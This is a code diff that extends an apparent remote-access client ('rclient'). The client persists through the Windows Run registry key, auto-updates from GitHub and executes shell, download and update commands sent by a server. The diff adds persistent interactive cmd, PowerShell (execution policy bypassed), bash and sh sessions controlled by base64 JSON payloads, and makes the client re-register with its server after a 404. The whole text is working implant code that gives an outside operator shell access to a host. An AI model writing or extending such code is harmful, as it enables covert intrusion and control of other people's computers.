@@ -7,6 +7,10 @@ import subprocess
 import sys
 import time
 import uuid
+import base64
+import json
+import queue
+import threading
 import ctypes
 import getpass
 from pathlib import Path
@@ -22,7 +26,7 @@ COMMAND_TIMEOUT_SECONDS = 120
 APP_NAME = "rclient"
 TASK_NAME = "rclient"
 RUN_REGISTRY_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-APP_VERSION = "1.0.0"
+APP_VERSION = "1.0.2"
 GITHUB_OWNER = "hezztecan-spec"
 GITHUB_REPO = "licilicl"
 AUTO_UPDATE_ENABLED = True
@@ -33,6 +37,7 @@ STATE_DIR = BASE_DIR / "state"
 DOWNLOADS_DIR = BASE_DIR / "downloads"
 CLIENT_ID_PATH = STATE_DIR / "client_id.txt"
 LOG_PATH = STATE_DIR / "client.log"
+TERMINAL_SESSIONS = {}
 
 
 def ensure_directories():
@@ -302,6 +307,216 @@ def execute_shell(command_text):
     return "\n\n".join(parts)
 
 
+class TerminalSession:
+    def __init__(self, session_id, terminal_type):
+        self.session_id = session_id
+        self.terminal_type = terminal_type
+        self.process = self._start_process(terminal_type)
+        self.output_queue = queue.Queue()
+        self.write_lock = threading.Lock()
+        self.reader_thread = threading.Thread(target=self._read_output, daemon=True)
+        self.reader_thread.start()
+
+    def _start_process(self, terminal_type):
+        if terminal_type == "cmd":
+            command = ["cmd.exe", "/Q", "/K"] if is_windows() else ["sh"]
+        elif terminal_type == "powershell":
+            if is_windows():
+                command = ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-"]
+            else:
+                command = ["pwsh", "-NoLogo", "-NoProfile", "-Command", "-"]
+        elif terminal_type == "bash":
+            command = ["bash"]
+        elif terminal_type == "sh":
+            command = ["sh"]
+        else:
+            raise ValueError(f"unsupported terminal type: {terminal_type}")
+
+        logging.info("Starting terminal session %s (%s)", self.session_id, terminal_type)
+        return subprocess.Popen(
+            command,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            cwd=str(BASE_DIR),
+            errors="replace",
+        )
+
+    def _read_output(self):
+        try:
+            while True:
+                line = self.process.stdout.readline()
+                if line == "":
+                    break
+                self.output_queue.put(line)
+        except Exception:
+            logging.exception("Terminal reader failed for %s", self.session_id)
+
+    def _send_text(self, text):
+        if self.process.poll() is not None:
+            raise RuntimeError("terminal session is closed")
+        if not self.process.stdin:
+            raise RuntimeError("terminal stdin is unavailable")
+        self.process.stdin.write(text)
+        self.process.stdin.flush()
+
+    def execute(self, command_text):
+        marker = uuid.uuid4().hex
+        end_marker = f"__CODEX_END__{marker}"
+        start_marker = f"__CODEX_START__{marker}"
+
+        with self.write_lock:
+            while True:
+                try:
+                    self.output_queue.get_nowait()
+                except queue.Empty:
+                    break
+
+            self._send_text(build_terminal_script(self.terminal_type, command_text, marker))
+            started = False
+            collected = []
+            exit_code = "unknown"
+            deadline = time.time() + COMMAND_TIMEOUT_SECONDS
+
+            while time.time() < deadline:
+                timeout = max(deadline - time.time(), 0.1)
+                try:
+                    chunk = self.output_queue.get(timeout=timeout)
+                except queue.Empty:
+                    continue
+
+                line = chunk.rstrip("\r\n")
+                if not started:
+                    if line == start_marker:
+                        started = True
+                    continue
+
+                if line.startswith(end_marker):
+                    _, _, exit_code = line.partition(":")
+                    break
+
+                collected.append(chunk)
+            else:
+                raise TimeoutError("interactive terminal command timed out")
+
+        output_text = "".join(collected).strip()
+        parts = [f"exit_code={exit_code}"]
+        if output_text:
+            parts.append(f"stdout:\n{output_text}")
+        return "\n\n".join(parts)
+
+    def close(self):
+        logging.info("Closing terminal session %s", self.session_id)
+        try:
+            if self.process.stdin:
+                self.process.stdin.close()
+        except Exception:
+            pass
+
+        if self.process.poll() is None:
+            try:
+                self.process.terminate()
+                self.process.wait(timeout=5)
+            except Exception:
+                try:
+                    self.process.kill()
+                except Exception:
+                    pass
+
+
+def build_terminal_script(terminal_type, command_text, marker):
+    start_marker = f"__CODEX_START__{marker}"
+    end_marker = f"__CODEX_END__{marker}"
+
+    if terminal_type == "cmd":
+        return (
+            f"echo {start_marker}\n"
+            f"{command_text}\n"
+            f"echo {end_marker}:%errorlevel%\n"
+        )
+
+    if terminal_type == "powershell":
+        return (
+            f'Write-Output "{start_marker}"\n'
+            "$global:LASTEXITCODE = 0\n"
+            f"{command_text}\n"
+            'if ($null -eq $LASTEXITCODE) { $LASTEXITCODE = 0 }\n'
+            f'Write-Output "{end_marker}:$LASTEXITCODE"\n'
+        )
+
+    return (
+        f"printf '%s\\n' '{start_marker}'\n"
+        "{\n"
+        f"{command_text}\n"
+        "}\n"
+        f"printf '%s:%s\\n' '{end_marker}' \"$?\"\n"
+    )
+
+
+def decode_terminal_payload(command_text, prefix):
+    payload = command_text[len(prefix) :].strip()
+    if not payload:
+        raise ValueError("terminal payload is empty")
+
+    decoded = base64.b64decode(payload.encode("ascii"))
+    parsed = json.loads(decoded.decode("utf-8"))
+    if not isinstance(parsed, dict):
+        raise ValueError("terminal payload must be an object")
+    return parsed
+
+
+def normalize_terminal_type(value):
+    terminal_type = str(value or "").strip().lower()
+    if terminal_type in {"cmd", "powershell", "bash", "sh"}:
+        return terminal_type
+    return "cmd" if is_windows() else "bash"
+
+
+def get_or_create_terminal_session(session_id, terminal_type):
+    session = TERMINAL_SESSIONS.get(session_id)
+    normalized_type = normalize_terminal_type(terminal_type)
+
+    if session and session.process.poll() is None and session.terminal_type == normalized_type:
+        return session
+
+    if session:
+        session.close()
+
+    new_session = TerminalSession(session_id, normalized_type)
+    TERMINAL_SESSIONS[session_id] = new_session
+    return new_session
+
+
+def execute_terminal(command_text):
+    payload = decode_terminal_payload(command_text, "terminal_exec:")
+    session_id = str(payload.get("session_id", "")).strip()
+    terminal_type = normalize_terminal_type(payload.get("terminal_type"))
+    command = str(payload.get("command", "")).strip()
+
+    if not session_id:
+        raise ValueError("terminal session_id is required")
+    if not command:
+        raise ValueError("terminal command is empty")
+
+    session = get_or_create_terminal_session(session_id, terminal_type)
+    return session.execute(command)
+
+
+def close_terminal(command_text):
+    payload = decode_terminal_payload(command_text, "terminal_close:")
+    session_id = str(payload.get("session_id", "")).strip()
+    if not session_id:
+        raise ValueError("terminal session_id is required")
+
+    session = TERMINAL_SESSIONS.pop(session_id, None)
+    if session:
+        session.close()
+
+    return f"terminal_session_closed={session_id}"
+
+
 def derive_filename_from_url(url):
     parsed = urlparse(url)
     name = Path(parsed.path).name
@@ -373,9 +588,13 @@ def execute_command(command_text):
         return execute_download(normalized)
     if normalized.startswith("update:"):
         return execute_update(normalized)
+    if normalized.startswith("terminal_exec:"):
+        return execute_terminal(normalized)
+    if normalized.startswith("terminal_close:"):
+        return close_terminal(normalized)
 
     raise ValueError(
-        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], or update:<url>"
+        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], update:<url>, terminal_exec:<payload>, or terminal_close:<payload>"
     )
 
 
@@ -703,6 +922,8 @@ def run_client():
         except requests.HTTPError as error:
             status_code = error.response.status_code if error.response is not None else "unknown"
             logging.exception("HTTP error while communicating with server: %s", status_code)
+            if status_code == 404:
+                register_client_with_retry(client_id)
         except Exception as error:
             logging.exception("Client loop failed: %s", error)
             try:
